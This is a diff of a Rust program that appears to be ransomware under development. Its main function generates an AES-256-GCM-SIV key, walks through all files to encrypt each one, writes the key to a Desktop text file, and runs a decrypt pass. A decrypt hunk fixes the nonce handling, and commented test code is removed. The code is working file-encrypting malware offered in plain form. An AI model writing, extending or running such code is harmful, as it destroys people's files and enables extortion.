@@ -41,50 +41,12 @@ fn main() {
     let mut nonce_array = [0u8; 12];
     rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
     let nonce = Nonce::from_slice(&nonce_array);
-
-    //FIXME: up to here. making the nonce
     let key = Aes256GcmSiv::generate_key(rng);
     let cipher = Aes256GcmSiv::new(&key);
-
-    //TESTCODE: delete later. shows the key so i dont lock myself out
-    //create a file called key.txt and write the key to it
-
-    // let mut key_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
-    // writeln!(key_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
-
     traverse(true, &cipher); //iterates through all the files and calls the encrypt function on each one
-
     let mut test_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
-    //write the key to the file
     writeln!(test_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
-
-    // let mut path = "C:\\Users\\win11\\Desktop\\key.txt";
-    // // //create a file called key.txt and write the key to it
-
-    // match File::create(&path) {
-    //     Ok(mut key_file) => match writeln!(key_file, "key: {:?}", hex::encode(&key)) {
-    //         Ok(_) => println!("Key written successfully to {}", path),
-    //         Err(e) => println!("Failed to write to file: {}", e),
-    //     },
-    //     Err(e) => println!("Failed to create file: {}", e),
-    // }
-
     traverse(false, &cipher);
-
-    // let mut test_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
-    // //write the key to the file
-    // writeln!(test_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
-
-    // let mut path = "C:\\Users\\win11\\Desktop\\key.txt";
-    // //create a file called key.txt and write the key to it
-
-    // match File::create(&path) {
-    //     Ok(mut key_file) => match writeln!(key_file, "key: {:?}", hex::encode(&key)) {
-    //         Ok(_) => println!("Key written successfully to {}", path),
-    //         Err(e) => println!("Failed to write to file: {}", e),
-    //     },
-    //     Err(e) => println!("Failed to create file: {}", e),
-    // }
 }
 
 fn display_message() {
@@ -276,11 +238,12 @@ fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
             let ciphertext = &buffer[12..];
 
             let cipher = Aes256GcmSiv::new(&decrypt_key);
-            let plaintext = cipher.decrypt(nonce, buffer.as_ref());
+            let plaintext = cipher.decrypt(nonce, ciphertext);
 
             let mut file = File::create(path)?;
             file.set_len(0);
             file.write_all(&plaintext.unwrap().as_slice());
+            // break;
         }
     }
     Ok(())
